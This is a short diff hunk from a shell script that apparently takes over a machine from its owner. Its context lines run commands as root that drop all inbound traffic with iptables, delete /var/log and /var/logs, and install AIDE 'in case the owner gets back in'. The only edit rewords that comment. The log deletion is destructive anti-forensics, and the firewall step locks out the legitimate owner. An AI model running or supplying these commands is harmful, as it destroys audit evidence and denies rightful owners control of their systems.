@@ -41,7 +41,7 @@ su -l -c "iptables -P INPUT DROP"
  
 su -l -c "rm -rf /var/log && rm -rf /var/logs"
 
-# Installs an intrusion detection system in case the owner gets back in.
+# Installs the AIDE intrusion detection system in case the owner gets back in.
 
 su - l -c "apt-get install aide"
  
